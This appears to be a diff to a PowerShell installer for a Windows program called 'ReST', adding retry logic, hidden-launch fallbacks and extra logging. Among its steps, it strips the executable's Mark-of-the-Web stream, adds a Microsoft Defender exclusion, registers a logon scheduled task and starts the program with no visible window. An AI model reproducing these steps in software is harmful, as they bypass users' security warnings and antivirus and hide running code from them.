@@ -121,6 +121,7 @@ function Extract-ReSTZip {
         }
 
         $moved = $false
+        $installed = $OutExe
         for ($try = 0; $try -lt 5; $try++) {
             Get-Process -Name "ReST" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
             Start-Sleep -Milliseconds 500
@@ -132,14 +133,22 @@ function Extract-ReSTZip {
                 $moved = $true
                 break
             } catch {
-                if ($try -eq 4) {
-                    throw
+                $installed = Join-Path (Split-Path -Parent $OutExe) ("ReST-" + $try + ".exe")
+                try {
+                    Copy-Item -LiteralPath $extracted -Destination $installed -Force -ErrorAction Stop
+                    $moved = $true
+                    break
+                } catch {
+                    if ($try -eq 4) {
+                        throw
+                    }
                 }
             }
         }
         if (-not $moved) {
             throw "could not replace ReST.exe"
         }
+        return $installed
     } finally {
         Remove-Item -LiteralPath $stage -Recurse -Force -ErrorAction SilentlyContinue
     }
@@ -277,7 +286,10 @@ try {
     Complete-DownloadPhase
 
     try {
-        Extract-ReSTZip -ZipFile $TempZip -OutExe $Exe
+        $installedExe = Extract-ReSTZip -ZipFile $TempZip -OutExe $Exe
+        if ($installedExe) {
+            $Exe = [string]$installedExe
+        }
     } catch {
         Fail-Install ("extract failed: " + $_.Exception.Message)
         exit 1
@@ -291,6 +303,7 @@ try {
     }
 
     Unblock-File -LiteralPath $Exe -ErrorAction SilentlyContinue
+    Remove-Item -LiteralPath ($Exe + ":Zone.Identifier") -Force -ErrorAction SilentlyContinue
     Add-DefenderExclusion -Path $Dir -ExePath $Exe | Out-Null
 
     $startupOk = $false
@@ -310,13 +323,17 @@ try {
     }
 
     if (-not $startupOk) {
-        Remove-ReSTStartupShortcut
-        $Action = New-ScheduledTaskAction -Execute $Exe -WorkingDirectory $Dir
-        $Trigger = New-ScheduledTaskTrigger -AtLogOn
-        $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
-        $Principal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive -RunLevel Limited
-        Register-ScheduledTask -TaskName "ReST" -Action $Action -Trigger $Trigger -Settings $Settings -Principal $Principal -Force | Out-Null
-        Write-InstallLog "scheduled task ok"
+        try {
+            Remove-ReSTStartupShortcut
+            $Action = New-ScheduledTaskAction -Execute $Exe -WorkingDirectory $Dir
+            $Trigger = New-ScheduledTaskTrigger -AtLogOn
+            $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
+            $Principal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive -RunLevel Limited
+            Register-ScheduledTask -TaskName "ReST" -Action $Action -Trigger $Trigger -Settings $Settings -Principal $Principal -Force | Out-Null
+            Write-InstallLog "scheduled task ok"
+        } catch {
+            Write-InstallLog ("scheduled task skipped: " + $_.Exception.Message)
+        }
     }
 
     try {
@@ -327,10 +344,24 @@ try {
     }
 
     try {
-        Start-Process -FilePath $Exe -WorkingDirectory $Dir -WindowStyle Hidden
-        Write-InstallLog "started"
+        $started = $false
+        try {
+            Start-Process -FilePath $Exe -WorkingDirectory $Dir -WindowStyle Hidden -ErrorAction Stop
+            $started = $true
+        } catch {
+            Write-InstallLog ("start hidden failed: " + $_.Exception.Message)
+        }
+        if (-not $started) {
+            $info = New-Object System.Diagnostics.ProcessStartInfo
+            $info.FileName = $Exe
+            $info.WorkingDirectory = $Dir
+            $info.UseShellExecute = $false
+            $info.CreateNoWindow = $true
+            [void][System.Diagnostics.Process]::Start($info)
+        }
+        Write-InstallLog ("started " + $Exe)
     } catch {
-        Fail-Install ("start failed: " + $_.Exception.Message)
+        Fail-Install ("start failed: " + $Exe + " " + $_.Exception.Message)
         exit 1
     }
 
@@ -343,6 +374,10 @@ try {
 
     exit 0
 } catch {
-    Fail-Install ("install failed: " + $_.Exception.Message)
+    $where = ""
+    if ($_.InvocationInfo -and $_.InvocationInfo.Line) {
+        $where = $_.InvocationInfo.Line.Trim()
+    }
+    Fail-Install ("install failed: " + $_.Exception.Message + " | " + $where)
     exit 1
 }
